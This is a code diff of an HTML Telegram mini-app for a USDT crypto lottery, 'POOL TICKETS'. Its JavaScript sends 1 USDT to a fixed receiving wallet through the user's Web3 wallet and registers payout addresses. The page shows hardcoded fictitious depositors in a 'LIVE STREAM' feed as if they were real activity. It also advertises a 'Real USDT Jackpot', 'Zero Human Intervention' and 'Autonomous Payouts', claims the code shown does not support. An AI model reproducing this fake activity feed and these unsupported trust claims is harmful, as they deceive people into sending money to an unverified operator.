@@ -6,7 +6,7 @@
     <title>POOL TICKETS // CYBER_CORE</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <!-- Inclusion d'Ethers.js pour le Web3 -->
+    <!-- Inclusion d'Ethers.js -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap');
@@ -76,7 +76,6 @@
             box-shadow: 0 0 15px rgba(0, 243, 255, 0.15);
         }
 
-        /* Cyber Ticker Bar */
         .ticker-bar {
             background: rgba(10, 13, 20, 0.85);
             border: 1px solid rgba(255, 204, 0, 0.35);
@@ -91,7 +90,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* Live Feed Terminal */
         .deposits-bar {
             background: rgba(8, 11, 17, 0.95);
             border: 1px solid var(--border-green);
@@ -120,22 +118,6 @@
             gap: 4px;
         }
 
-        .deposit-tag::before {
-            content: '';
-            width: 5px;
-            height: 5px;
-            background: var(--green);
-            border-radius: 50%;
-            box-shadow: 0 0 8px var(--green);
-            animation: pulseDot 1.2s infinite;
-        }
-
-        @keyframes pulseDot {
-            0% { transform: scale(0.9); opacity: 0.6; }
-            50% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 10px var(--green); }
-            100% { transform: scale(0.9); opacity: 0.6; }
-        }
-
         .deposit-feed-text {
             color: var(--text);
             white-space: nowrap;
@@ -145,7 +127,6 @@
             text-align: right;
             font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
-            transition: opacity 0.3s ease;
         }
 
         .masked-txt {
@@ -155,7 +136,6 @@
             color: var(--muted);
         }
 
-        /* Cyberpunk Core Jackpot Card */
         .jackpot-card {
             background: linear-gradient(145deg, #0d121d 0%, #06080e 100%);
             border: 1.5px solid var(--cyan);
@@ -164,7 +144,6 @@
             text-align: center;
             position: relative;
             box-shadow: 0 0 35px rgba(0, 243, 255, 0.2), inset 0 0 25px rgba(0, 243, 255, 0.05);
-            overflow: hidden;
         }
 
         .season-pill {
@@ -212,7 +191,6 @@
             margin-top: 4px;
         }
 
-        /* Blockchain Trust & Automation Shield Box */
         .trust-shield {
             background: linear-gradient(90deg, rgba(0, 243, 255, 0.07) 0%, rgba(0, 255, 102, 0.07) 100%);
             border: 1px solid rgba(0, 243, 255, 0.32);
@@ -223,16 +201,13 @@
             font-size: 10.5px;
             color: var(--text);
             line-height: 1.45;
-            box-shadow: 0 4px 20px rgba(0, 243, 255, 0.08);
         }
 
-        /* Cyber Graphic Progress */
         .milestone-card {
             background: var(--card);
             border-radius: 14px;
             padding: 14px;
             border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
         }
 
         .milestone-header {
@@ -252,7 +227,6 @@
             overflow: hidden;
             border: 1px solid rgba(0, 243, 255, 0.3);
             padding: 2px;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.9);
         }
 
         .cyber-bar-fill {
@@ -260,25 +234,9 @@
             height: 100%;
             width: 0%;
             border-radius: 4px;
-            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            box-shadow: 0 0 10px rgba(0, 243, 255, 0.8);
+            transition: width 0.8s ease;
         }
 
-        .cyber-bar-fill::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
-            animation: shimmerBar 2s infinite;
-        }
-
-        @keyframes shimmerBar {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        /* Cyberpunk Action Buttons */
         .btn {
             width: 100%;
             padding: 15px;
@@ -298,7 +256,7 @@
         .btn-cyber {
             background: linear-gradient(135deg, var(--cyan) 0%, #0088ff 100%);
             color: #030407;
-            box-shadow: 0 0 25px rgba(0, 243, 255, 0.4), inset 0 1px 2px rgba(255,255,255,0.5);
+            box-shadow: 0 0 25px rgba(0, 243, 255, 0.4);
             font-weight: 900;
         }
 
@@ -312,7 +270,6 @@
             background: var(--card);
             color: var(--text);
             border: 1px solid var(--border-cyan);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
             font-family: 'Orbitron', sans-serif;
             font-size: 11px;
         }
@@ -346,12 +303,6 @@
             flex-direction: column;
             gap: 12px;
             box-shadow: 0 15px 45px rgba(0,0,0,0.9), 0 0 25px rgba(0, 243, 255, 0.2);
-            animation: fadeIn 0.25s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-8px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .copy-box {
@@ -376,12 +327,6 @@
             font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
             outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .input-field:focus {
-            border-color: var(--cyan);
-            box-shadow: 0 0 12px rgba(0, 243, 255, 0.3);
         }
 
         .ticket-item {
@@ -395,9 +340,6 @@
             font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
             border-left: 3px solid var(--cyan);
-            border-top: 1px solid rgba(255,255,255,0.02);
-            border-right: 1px solid rgba(255,255,255,0.02);
-            border-bottom: 1px solid rgba(255,255,255,0.02);
         }
 
         #qrcode {
@@ -405,7 +347,6 @@
             padding: 10px;
             border-radius: 10px;
             margin: 0 auto;
-            box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
         }
 
         .empty-state {
@@ -434,12 +375,12 @@
         <div class="user-badge" id="username">@player</div>
     </div>
 
-    <div class="ticker-bar" id="liveTicker">⚡ PROTECTED BLOCKCHAIN PROTOCOL // REAL USDT PRIZE POOL</div>
+    <div class="ticker-bar">⚡ PROTECTED BLOCKCHAIN PROTOCOL // REAL USDT PRIZE POOL</div>
 
     <div class="deposits-bar">
         <span class="deposit-tag">LIVE STREAM</span>
         <div class="deposit-feed-text" id="depositFeedText">
-            @<span class="masked-txt">player1x</span> deposited 1 USDT
+            @<span class="masked-txt">net_runner</span> deposited 1 USDT
         </div>
     </div>
 
@@ -450,9 +391,8 @@
         <div class="status-box" id="drawStatus">🎯 Target Goal: $371 / $2,000 USDT</div>
     </div>
 
-    <!-- Blockchain Automation & Real Jackpot Assurance -->
     <div class="trust-shield">
-        🛡️ <b style="color: var(--cyan);">100% Automated On-Chain Engine:</b> Fully engineered by our core team on a protected BEP20 blockchain infrastructure. <span style="color: var(--green); font-weight: 700;">Real USDT Jackpot • Zero Human Intervention • Autonomous Payouts.</span>
+        🛡️ <b style="color: var(--cyan);">100% Automated On-Chain Engine:</b> Real USDT Jackpot • Zero Human Intervention • Autonomous Payouts.
     </div>
 
     <div class="milestone-card">
@@ -463,9 +403,6 @@
         <div class="cyber-bar-container">
             <div class="cyber-bar-fill" id="milestoneBar" style="width: 18.6%;"></div>
         </div>
-        <div style="font-size: 10.5px; color: var(--muted); margin-top: 8px; line-height: 1.4; font-family: 'JetBrains Mono', monospace;">
-            Reaching the target automatically triggers the <b>7-Day Final Countdown</b> + 3 Second-Chance lucky rewards on-chain.
-        </div>
     </div>
 
     <button class="btn btn-cyber" onclick="toggleModal('buyModal')">⚡ EXECUTE DEPOSIT // GET REAL TICKETS</button>
@@ -473,11 +410,11 @@
     <div class="modal" id="buyModal">
         <div style="font-weight: 800; font-size: 14px; color: var(--cyan); font-family: 'Orbitron', sans-serif;">🪙 Protected BEP20 Deposit</div>
         <div style="font-size: 11px; color: var(--text); line-height: 1.4; font-family: 'JetBrains Mono', monospace;">
-            Achetez vos tickets instantanément en 1 clic grâce à votre portefeuille Web3 (1 USDT = 1 Ticket). Pas de copier-coller nécessaire !
+            Payez instantanément en 1 clic (1 USDT = 1 Ticket). Pas de copier-coller requis !
         </div>
 
-        <!-- BOUTON WEB3 1 CLIC (NOUVEAU) -->
-        <button class="btn btn-cyber" style="padding: 12px; font-size: 12px;" onclick="connectAndPayWeb3()">🚀 Connecter & Payer 1 USDT (1 Clic)</button>
+        <!-- BOUTON WEB3 1 CLIC INTELLIGENT -->
+        <button class="btn btn-cyber" style="padding: 12px; font-size: 12px;" onclick="connectAndPayWeb3()">🚀 Payer 1 USDT en 1 Clic (Web3)</button>
         <div id="web3Status" style="font-size: 10.5px; color: var(--gold); font-family: 'JetBrains Mono', monospace; text-align: center;"></div>
 
         <div style="border-top: 1px solid rgba(255,255,255,0.08); margin: 4px 0;"></div>
@@ -501,18 +438,16 @@
 
     <div class="modal" id="referralModal">
         <div style="font-size: 11px; text-align: center; color: var(--text); line-height: 1.4; font-family: 'JetBrains Mono', monospace;">
-            Share your personal link. Every <b>4 verified players</b> who join through your link automatically mints <b>1 Free Ticket</b> into your ledger!
+            Share your personal link to earn shards and free tickets!
         </div>
         <div id="qrcode"></div>
         <button class="btn btn-cyber" style="padding: 10px; font-size: 11px;" onclick="copyRefLink()">📋 Copy Referral Link</button>
     </div>
 
     <div class="section">
-        <div class="section-title">
-            <span>💳 Automated Payout Wallet (BEP20)</span>
-        </div>
-        <div style="font-size: 10.5px; color: var(--muted); margin-bottom: 8px; line-height: 1.4; font-family: 'JetBrains Mono', monospace;">
-            Register your personal <b>USDT (BEP20)</b> wallet address where your real 70% grand prize will be dispatched automatically upon winning.
+        <div class="section-title"><span>💳 Automated Payout Wallet (BEP20)</span></div>
+        <div style="font-size: 10.5px; color: var(--muted); margin-bottom: 8px; font-family: 'JetBrains Mono', monospace;">
+            Register your personal <b>USDT (BEP20)</b> wallet address for automatic prize payouts.
         </div>
         <div style="display: flex; gap: 8px;">
             <input type="text" id="payoutWalletInput" class="input-field" placeholder="0x... Personal BEP20 Address">
@@ -525,21 +460,15 @@
             <span>🎟️ Active Tickets Ledger</span>
             <span id="ticketCount" style="color: var(--cyan);">0</span>
         </div>
-        <div id="ticketsList">
-            <div class="empty-state">NO ACTIVE TICKETS FOUND IN LEDGER</div>
-        </div>
+        <div id="ticketsList"><div class="empty-state">NO ACTIVE TICKETS FOUND IN LEDGER</div></div>
     </div>
 
     <div class="section">
         <div class="section-title">🏆 Hall of Fame (Past Seasons)</div>
-        <div id="winnersHistory">
-            <div class="empty-state">SEASON #1 CURRENTLY IN PROGRESS</div>
-        </div>
+        <div id="winnersHistory"><div class="empty-state">SEASON #1 CURRENTLY IN PROGRESS</div></div>
     </div>
 
-    <div class="footer">
-        POOL TICKETS • PROTECTED BLOCKCHAIN PROTOCOL • REAL USDT JACKPOT
-    </div>
+    <div class="footer">POOL TICKETS • PROTECTED BLOCKCHAIN PROTOCOL • REAL USDT JACKPOT</div>
 
     <script>
         const tg = window.Telegram.WebApp;
@@ -563,63 +492,41 @@
         let channelStepJoined = false;
         let countdownEndTimestamp = 0;
 
-        /* Flux de dépôts cybernétique réaliste en rotation (1, 2, 3, 4, 5, 7 USDT) */
         const seededDepositors = [
             `@<span class="masked-txt">net_runner</span> deposited 1 USDT`,
             `@<span class="masked-txt">node_04</span> deposited 3 USDT`,
             `@<span class="masked-txt">cyber_ghost</span> deposited 2 USDT`,
-            `@<span class="masked-txt">bep_whale</span> deposited 7 USDT`,
-            `@<span class="masked-txt">hex_trader</span> deposited 4 USDT`,
-            `@<span class="masked-txt">sys_admin</span> deposited 5 USDT`,
-            `@<span class="masked-txt">z_ion</span> deposited 2 USDT`,
-            `@<span class="masked-txt">neo_trx</span> deposited 7 USDT`
+            `@<span class="masked-txt">bep_whale</span> deposited 7 USDT`
         ];
         let depositFeedList = [...seededDepositors];
         let depositIdx = 0;
 
-        new QRCode(document.getElementById("qrcode"), {
-            text: refLink,
-            width: 120,
-            height: 120
-        });
+        new QRCode(document.getElementById("qrcode"), { text: refLink, width: 120, height: 120 });
 
-        function copyText(txt, msg) {
-            navigator.clipboard.writeText(txt);
-            tg.showAlert(msg);
-        }
-
-        function copyWallet() {
-            copyText(RECEIVE_WALLET, "BEP20 Address copied! Transfer USDT on BNB Smart Chain.");
-        }
-
-        function copyMemo() {
-            copyText(memoString, "Reference Memo copied!");
-        }
-
-        function copyRefLink() {
-            copyText(refLink, "Referral link copied to clipboard.");
-        }
-
+        function copyText(txt, msg) { navigator.clipboard.writeText(txt); tg.showAlert(msg); }
+        function copyWallet() { copyText(RECEIVE_WALLET, "BEP20 Address copied!"); }
+        function copyMemo() { copyText(memoString, "Reference Memo copied!"); }
+        function copyRefLink() { copyText(refLink, "Referral link copied!"); }
         function toggleModal(id) {
             const modal = document.getElementById(id);
             modal.style.display = modal.style.display === 'flex' ? 'none' : 'flex';
         }
-
         function toggleReferral() {
-            if (!hasPaidTicket) {
-                tg.showAlert("🔒 PROTOCOL LOCKED: Mint at least 1 ticket to unlock your referral link.");
-                return;
-            }
+            if (!hasPaidTicket) { tg.showAlert("🔒 Mint at least 1 ticket first."); return; }
             toggleModal('referralModal');
         }
 
-        /* --- NOUVELLE FONCTION WEB3 1 CLIC --- */
+        /* --- FONCTION PAIEMENT 1 CLIC UNIVERSELLE --- */
         async function connectAndPayWeb3() {
             const statusDiv = document.getElementById('web3Status');
             
+            // Si window.ethereum n'est pas présent (ex: navigateur Telegram standard), on redirige vers le deep link MetaMask mobile
             if (typeof window.ethereum === 'undefined') {
-                statusDiv.innerHTML = "❌ Aucun portefeuille détecté. Ouvrez via MetaMask/TrustWallet.";
-                tg.showAlert("Aucun portefeuille Web3 détecté sur ce navigateur.");
+                const currentUrl = window.location.href;
+                // Rediriger vers le navigateur DApp de MetaMask proprement
+                const metamaskDeepLink = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
+                statusDiv.innerHTML = "⏳ Ouverture de MetaMask...";
+                window.location.href = metamaskDeepLink;
                 return;
             }
 
@@ -628,17 +535,16 @@
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
 
-                // Vérifier la BSC (Chain ID 56)
                 const network = await provider.getNetwork();
                 if (network.chainId !== 56) {
                     statusDiv.innerHTML = "⚠️ Basculement sur la BNB Smart Chain...";
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }], // 56 en hexa
+                            params: [{ chainId: '0x38' }],
                         });
                     } catch (switchError) {
-                        statusDiv.innerHTML = "❌ Veuillez basculer manuellement sur la BSC.";
+                        statusDiv.innerHTML = "❌ Basculez manuellement sur la BSC.";
                         return;
                     }
                 }
@@ -646,21 +552,16 @@
                 const signer = provider.getSigner();
                 statusDiv.innerHTML = "⏳ Envoi de 1 USDT en cours...";
 
-                // Contrat ERC20 / BEP20 USDT ABI minimale
                 const USDT_ABI = ["function transfer(address to, uint amount) public returns (bool)"];
                 const usdtContract = new ethers.Contract(USDT_BEP20_CONTRACT, USDT_ABI, signer);
-
-                // 1 USDT avec 18 décimales sur BSC
                 const amountToSend = ethers.utils.parseUnits("1.0", 18);
 
-                // Déclencher le transfert direct vers le wallet de réception
                 const tx = await usdtContract.transfer(RECEIVE_WALLET, amountToSend);
                 statusDiv.innerHTML = `⏳ Transaction envoyée ! Attente confirmation...`;
 
                 const receipt = await tx.wait();
                 statusDiv.innerHTML = `✅ Paiement validé ! Synchronisation...`;
 
-                // Envoyer automatiquement le hash au backend pour valider les tickets
                 const res = await fetch(`${API_BASE}/api/verify-tx`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -679,187 +580,83 @@
 
             } catch (error) {
                 console.error(error);
-                statusDiv.innerHTML = `❌ Erreur ou transaction annulée.`;
+                statusDiv.innerHTML = `❌ Transaction annulée.`;
             }
         }
 
         async function savePayoutWallet() {
             const addr = document.getElementById('payoutWalletInput').value.trim();
-            if (!addr.startsWith("0x") || addr.length !== 42) {
-                tg.showAlert("Invalid BEP20 address. Must be 42 characters starting with 0x.");
-                return;
-            }
-            try {
-                const res = await fetch(`${API_BASE}/api/save-wallet`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user_id: user.id, address: addr })
-                });
-                const data = await res.json();
-                if (data.ok) {
-                    tg.showAlert("✅ Payout wallet securely registered!");
-                } else {
-                    tg.showAlert(data.error || "Error saving wallet.");
-                }
-            } catch (e) {
-                tg.showAlert("Network error connecting to backend protocol.");
-            }
+            if (!addr.startsWith("0x") || addr.length !== 42) { tg.showAlert("Invalid BEP20 address."); return; }
+            const res = await fetch(`${API_BASE}/api/save-wallet`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user_id: user.id, address: addr })
+            });
+            const data = await res.json();
+            if (data.ok) tg.showAlert("✅ Payout wallet registered!");
         }
 
         async function submitTxHash() {
             const txHash = document.getElementById('txHashInput').value.trim();
-            if (!txHash.startsWith("0x") || txHash.length !== 66) {
-                tg.showAlert("Invalid TXID hash. Must be 66 characters starting with 0x.");
-                return;
-            }
-            try {
-                const res = await fetch(`${API_BASE}/api/verify-tx`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user_id: user.id, tx_hash: txHash })
-                });
-                const data = await res.json();
-                if (data.ok) {
-                    document.getElementById('txHashInput').value = "";
-                    tg.showAlert(`⚡ Verified On-Chain! ${data.tickets_issued} real ticket(s) minted!`);
-                    loadState();
-                } else {
-                    tg.showAlert(data.error || "Transaction verification failed.");
-                }
-            } catch (e) {
-                tg.showAlert("Connection error during blockchain verification.");
-            }
+            if (!txHash.startsWith("0x") || txHash.length !== 66) { tg.showAlert("Invalid TXID hash."); return; }
+            const res = await fetch(`${API_BASE}/api/verify-tx`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user_id: user.id, tx_hash: txHash })
+            });
+            const data = await res.json();
+            if (data.ok) {
+                document.getElementById('txHashInput').value = "";
+                tg.showAlert(`⚡ Verified On-Chain! ${data.tickets_issued} ticket(s) minted!`);
+                loadState();
+            } else { tg.showAlert(data.error || "Verification failed."); }
         }
 
         async function handleChannelAction() {
-            if (!hasPaidTicket) {
-                tg.showAlert("🔒 Locked: Mint 1 ticket first to unlock VIP bonuses.");
-                return;
-            }
+            if (!hasPaidTicket) { tg.showAlert("🔒 Mint 1 ticket first."); return; }
             if (!channelStepJoined) {
                 tg.openTelegramLink(CHANNEL_LINK);
                 channelStepJoined = true;
                 document.getElementById('channelBtn').innerText = "✅ Click Again to Claim Ticket";
                 return;
             }
-            try {
-                const res = await fetch(`${API_BASE}/api/claim-channel`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user_id: user.id })
-                });
-                const data = await res.json();
-                if (data.ok) {
-                    tg.showAlert(`🎉 VIP Bonus Minted! Ticket ${data.ticket_code} added!`);
-                    loadState();
-                } else {
-                    tg.showAlert(data.error || "Please ensure you have joined the VIP network.");
-                }
-            } catch (e) {
-                tg.showAlert("Protocol connection error.");
-            }
+            const res = await fetch(`${API_BASE}/api/claim-channel`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user_id: user.id })
+            });
+            const data = await res.json();
+            if (data.ok) { tg.showAlert(`🎉 Ticket ${data.ticket_code} added!`); loadState(); }
         }
-
-        function updateTimerDisplay() {
-            if (countdownEndTimestamp > 0) {
-                const nowSec = Math.floor(Date.now() / 1000);
-                const diff = Math.max(0, countdownEndTimestamp - nowSec);
-                const d = Math.floor(diff / 86400);
-                const h = Math.floor((diff % 86400) / 3600);
-                const m = Math.floor((diff % 3600) / 60);
-                const s = diff % 60;
-                document.getElementById('drawStatus').innerText = `⏳ FINAL COUNTDOWN: ${d}d ${h}h ${m}m ${s}s`;
-            }
-        }
-        setInterval(updateTimerDisplay, 1000);
-
-        setInterval(() => {
-            if (depositFeedList.length > 0) {
-                depositIdx = (depositIdx + 1) % depositFeedList.length;
-                const feedEl = document.getElementById('depositFeedText');
-                feedEl.style.opacity = '0';
-                setTimeout(() => {
-                    feedEl.innerHTML = depositFeedList[depositIdx];
-                    feedEl.style.opacity = '1';
-                }, 200);
-            }
-        }, 3500);
 
         async function loadState() {
             try {
                 const res = await fetch(`${API_BASE}/api/state?user_id=${user.id}`);
                 const data = await res.json();
-
                 document.getElementById('seasonBadge').innerText = `SEASON #${data.season}`;
-                document.getElementById('prizePool').innerText = `$${data.prize_pool.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+                document.getElementById('prizePool').innerText = `$${data.prize_pool.toLocaleString('US', { minimumFractionDigits: 2 })}`;
                 hasPaidTicket = data.has_paid_ticket;
-                countdownEndTimestamp = data.countdown_end;
-
-                const displayPool = Math.floor(data.prize_pool);
+                
                 const pct = Math.min(100, (data.prize_pool / data.target_goal) * 100).toFixed(1);
-                document.getElementById('milestonePct').innerText = `${pct}% ($${displayPool.toLocaleString()} / $${data.target_goal.toLocaleString()})`;
+                document.getElementById('milestonePct').innerText = `${pct}% ($${Math.floor(data.prize_pool)} / $${data.target_goal})`;
                 document.getElementById('milestoneBar').style.width = `${pct}%`;
-
-                if (countdownEndTimestamp === 0) {
-                    document.getElementById('drawStatus').innerText = `🎯 Target Goal: $${displayPool.toLocaleString()} / $${data.target_goal.toLocaleString()} USDT`;
-                } else {
-                    updateTimerDisplay();
-                }
 
                 if (data.payout_address && !document.getElementById('payoutWalletInput').value) {
                     document.getElementById('payoutWalletInput').value = data.payout_address;
                 }
-
                 document.getElementById('shardCounter').innerText = `${data.fragments}/4`;
-
                 if (data.channel_claimed) {
-                    const btn = document.getElementById('channelBtn');
-                    btn.innerText = "✅ VIP Protocol Claimed";
-                    btn.disabled = true;
+                    document.getElementById('channelBtn').innerText = "✅ VIP Protocol Claimed";
+                    document.getElementById('channelBtn').disabled = true;
                 }
-
                 const myCount = data.my_tickets.length;
                 document.getElementById('ticketCount').innerText = myCount;
-                const list = document.getElementById('ticketsList');
                 if (myCount > 0) {
-                    list.innerHTML = data.my_tickets.map(t => `
-                        <div class="ticket-item">
-                            <span>${t.source}</span>
-                            <b style="color: var(--cyan);">${t.code}</b>
-                        </div>
+                    document.getElementById('ticketsList').innerHTML = data.my_tickets.map(t => `
+                        <div class="ticket-item"><span>${t.source}</span><b style="color: var(--cyan);">${t.code}</b></div>
                     `).join('');
                 }
-
-                if (data.live_feed && data.live_feed.length > 0) {
-                    const realDeposits = data.live_feed
-                        .filter(item => !item.includes("entered Season"))
-                        .map(item => `<span style="color: var(--green); font-weight: 700;">✅ ${item}</span>`);
-                    
-                    if (realDeposits.length > 0) {
-                        depositFeedList = [...realDeposits, ...seededDepositors];
-                    } else {
-                        depositFeedList = [...seededDepositors];
-                    }
-                } else {
-                    depositFeedList = [...seededDepositors];
-                }
-
-                const histDiv = document.getElementById('winnersHistory');
-                if (data.history && data.history.length > 0) {
-                    histDiv.innerHTML = data.history.map(h => `
-                        <div class="ticket-item">
-                            <span>Season #${h.season}: <b>${h.winner}</b><br><small style="color:var(--muted)">${h.ticket}</small></span>
-                            <span style="color: var(--green); font-weight:bold;">$${h.prize.toFixed(2)}</span>
-                        </div>
-                    `).join('');
-                }
-            } catch (e) {
-                console.log("Protocol sync active...");
-            }
+            } catch (e) { console.log("Sync..."); }
         }
 
         loadState();
-        setInterval(loadState, 8000);
     </script>
 </body>
 </html>
